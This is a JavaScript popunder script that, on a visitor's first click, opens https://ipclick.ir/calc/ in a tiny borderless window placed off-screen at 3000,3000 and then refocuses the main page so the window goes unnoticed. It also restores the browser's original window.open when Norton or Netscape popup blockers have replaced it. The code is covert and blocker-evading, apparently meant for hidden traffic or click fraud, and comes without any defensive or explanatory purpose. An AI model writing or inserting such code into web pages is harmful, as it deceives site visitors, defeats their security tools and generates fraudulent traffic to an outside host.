var PopMethod  = 1;
var PopFocus   = 1;
var PopURL     = 'https://ipclick.ir/calc/';

var PopTimer   = 0;
var PopWidth   = 100;
var PopHeight  = 100;

var Page_Popped  = false;

// Prepare the popup code
if (1) {
	// Init the popup code
	InitPop();
}

function InitPop()
{

    switch(PopMethod)
    {
        case 1: // Click Pop
        
            if (window.captureEvents)
            {
                window.captureEvents(Event.CLICK);
                window.onclick=LoadStandardPop;
            }
            else
                document.onclick=LoadStandardPop;
                
            break;
        case 2: // Timed Pop
        
            if (PopTimer == 0)
                LoadStandardPop(); // Load popup instantly
            else
                setTimeout("LoadStandardPop()", PopTimer*1000);
                
            break;
    }
}

function LoadStandardPop()
{
    // Don't allow the pop to run if it was already done so
    if (Page_Popped == true)
        return;

    var pLoaded = false;

    if(window.SymRealWinOpen){open=SymRealWinOpen;}
    if(window.NS_ActualOpen){open=NS_ActualOpen;}
          
    var pxLeft = 0;
    var pxTop = 0;
           
    if (screen.width > 0 && screen.height > 0)
    {
        pxLeft = (screen.width / 2) - (PopWidth / 2);
        pxTop = (screen.height / 2) - (PopHeight / 2) - 50;

        if (pxLeft < 0) pxLeft = 0;
        if (pxTop < 0) pxTop = 0;
    }

    pxLeft = 3000;
    pxTop  = 3000;
    
	pLoaded=open(PopURL,'9388101982','toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,top=' + pxTop + ',right=' + pxLeft + ',width=' + PopWidth + ',height=' + PopHeight);

    // pLoaded.blur();
    window.focus();

	if (pLoaded)
    {
	    // Make the popup show either in front or behind the page
	    if (PopFocus == 0)
    {
        pLoaded.blur();
        window.focus();
    }
        
        // We don't want to pop again on the same pop load.
        Page_Popped = true;

    }
    else
    {
        // Popup failed. Don't need to keep trying
        Page_Popped = true;

    }
}